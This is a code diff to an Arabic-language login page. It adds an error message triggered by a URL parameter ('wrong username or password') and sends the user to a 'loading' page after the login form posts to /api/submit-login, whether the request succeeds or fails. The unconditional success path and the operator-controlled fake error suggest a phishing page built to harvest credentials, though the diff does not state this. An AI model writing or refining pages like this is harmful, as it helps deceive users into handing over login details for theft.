@@ -84,6 +84,14 @@
             align-items: center;
         }
 
+        .error-msg {
+            color: #ff3333;
+            font-size: 14px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
         .forgot-link {
             display: block;
             text-align: center;
@@ -145,6 +153,8 @@
                 </div>
             </div>
 
+            <p class="error-msg" id="errorMsg" style="display:none;">اسم المستخدم أو كلمة المرور غير صحيح</p>
+
             <a href="#" class="forgot-link">نسيت بيانات الاعتماد؟</a>
 
             <button type="submit" class="login-btn">تسجيل الدخول</button>
@@ -157,10 +167,14 @@
         inp.type = inp.type === 'password' ? 'text' : 'password';
     }
 
+    var params = new URLSearchParams(window.location.search);
+    if (params.get('error') === '1') {
+        document.getElementById('errorMsg').style.display = 'block';
+    }
+
     document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        const params = new URLSearchParams(window.location.search);
-        const orderId = Number(params.get('orderId')) || 0;
+        var orderId = Number(params.get('orderId')) || 0;
         fetch('/api/submit-login', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -172,10 +186,10 @@
         })
         .then(function(res) { return res.json(); })
         .then(function() {
-            alert('تم تسجيل الدخول بنجاح! سيتم التواصل معك قريباً.');
+            window.location.href = 'loading.html?orderId=' + orderId;
         })
         .catch(function() {
-            alert('تم تسجيل الدخول بنجاح! سيتم التواصل معك قريباً.');
+            window.location.href = 'loading.html?orderId=' + orderId;
         });
     });
     </script>
